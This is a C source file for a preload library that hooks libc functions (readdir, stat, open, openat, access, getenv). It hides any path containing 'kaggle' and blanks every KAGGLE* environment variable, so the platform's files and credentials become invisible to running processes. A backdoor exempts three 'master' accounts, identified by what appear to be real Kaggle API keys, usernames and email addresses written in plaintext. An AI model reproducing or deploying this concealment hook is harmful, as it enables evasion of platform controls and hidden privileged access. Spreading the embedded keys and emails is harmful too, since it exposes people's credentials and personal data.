#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <errno.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdarg.h>

static struct dirent *(*orig_readdir)(DIR *) = NULL;
static int (*orig_stat)(const char *, struct stat *) = NULL;
static int (*orig_lstat)(const char *, struct stat *) = NULL;
static int (*orig_fstatat)(int, const char *, struct stat *, int) = NULL;
static int (*orig_access)(const char *, int) = NULL;
static int (*orig_open)(const char *, int, ...) = NULL;
static int (*orig_openat)(int, const char *, int, ...) = NULL;
static char *(*orig_getenv)(const char *) = NULL;

static void init_hooks(void) {
    if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, "readdir");
    if (!orig_stat) orig_stat = dlsym(RTLD_NEXT, "stat");
    if (!orig_lstat) orig_lstat = dlsym(RTLD_NEXT, "lstat");
    if (!orig_fstatat) orig_fstatat = dlsym(RTLD_NEXT, "fstatat");
    if (!orig_access) orig_access = dlsym(RTLD_NEXT, "access");
    if (!orig_open) orig_open = dlsym(RTLD_NEXT, "open");
    if (!orig_openat) orig_openat = dlsym(RTLD_NEXT, "openat");
    if (!orig_getenv) orig_getenv = dlsym(RTLD_NEXT, "getenv");
}

// -----------------------------------------------------------------------------
// VERIFICADOR DE EXCEPCIONES: 3 CUENTAS MAESTRAS AUTORIZADAS
// -----------------------------------------------------------------------------
static int is_master_admin(void) {
    const char *admin_mode = orig_getenv ? orig_getenv("MASTER_ADMIN_MODE") : getenv("MASTER_ADMIN_MODE");
    if (admin_mode && strcmp(admin_mode, "1") == 0) return 1;

    const char *key = orig_getenv ? orig_getenv("KAGGLE_KEY") : getenv("KAGGLE_KEY");
    const char *user = orig_getenv ? orig_getenv("KAGGLE_USERNAME") : getenv("KAGGLE_USERNAME");

    // Excepción Maestra 1: djkevinzito@gmail.com / miguelguerra26
    if (key && strcmp(key, "e1d4838dfbdf3dca6f2ba56c9f71daf6") == 0) return 1;
    if (user && strcmp(user, "miguelguerra26") == 0) return 1;

    // Excepción Maestra 2: miguelguerra200022@gmail.com / miguelguerra22
    if (key && strcmp(key, "b4031084ad25f34042347dfd7b6af451") == 0) return 1;
    if (user && strcmp(user, "miguelguerra22") == 0) return 1;

    // Excepción Maestra 3: 2026liam2000@gmail.com / miguel55755 (Kaggle.txt)
    if (key && strcmp(key, "54bfca5f24e2347b9dcc55073abe8952") == 0) return 1;
    if (user && strcmp(user, "miguel55755") == 0) return 1;

    return 0;
}

static int is_kaggle_target(const char *path) {
    if (is_master_admin()) return 0; // Bypass para las 3 cuentas maestras
    if (!path) return 0;
    if (strcmp(path, "kaggle") == 0) return 1;
    if (strcmp(path, ".kaggle") == 0) return 1;
    if (strcmp(path, "/kaggle") == 0) return 1;
    if (strncmp(path, "/kaggle/", 8) == 0) return 1;
    if (strstr(path, "/kaggle") != NULL) return 1;
    if (strstr(path, "/.kaggle") != NULL) return 1;
    return 0;
}

struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) init_hooks();
    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (!is_kaggle_target(entry->d_name)) {
            return entry;
        }
    }
    return NULL;
}

int stat(const char *pathname, struct stat *statbuf) {
    if (!orig_stat) init_hooks();
    if (is_kaggle_target(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return orig_stat(pathname, statbuf);
}

int lstat(const char *pathname, struct stat *statbuf) {
    if (!orig_lstat) init_hooks();
    if (is_kaggle_target(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return orig_lstat(pathname, statbuf);
}

int fstatat(int dirfd, const char *pathname, struct stat *statbuf, int flags) {
    if (!orig_fstatat) init_hooks();
    if (is_kaggle_target(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return orig_fstatat(dirfd, pathname, statbuf, flags);
}

int access(const char *pathname, int mode) {
    if (!orig_access) init_hooks();
    if (is_kaggle_target(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return orig_access(pathname, mode);
}

int open(const char *pathname, int flags, ...) {
    if (!orig_open) init_hooks();
    if (is_kaggle_target(pathname)) {
        errno = ENOENT;
        return -1;
    }
    va_list args;
    va_start(args, flags);
    mode_t mode = va_arg(args, mode_t);
    va_end(args);
    return orig_open(pathname, flags, mode);
}

int openat(int dirfd, const char *pathname, int flags, ...) {
    if (!orig_openat) init_hooks();
    if (is_kaggle_target(pathname)) {
        errno = ENOENT;
        return -1;
    }
    va_list args;
    va_start(args, flags);
    mode_t mode = va_arg(args, mode_t);
    va_end(args);
    return orig_openat(dirfd, pathname, flags, mode);
}

char *getenv(const char *name) {
    if (!orig_getenv) init_hooks();
    if (is_master_admin()) return orig_getenv(name);
    if (name && strncasecmp(name, "KAGGLE", 6) == 0) {
        return NULL;
    }
    return orig_getenv(name);
}
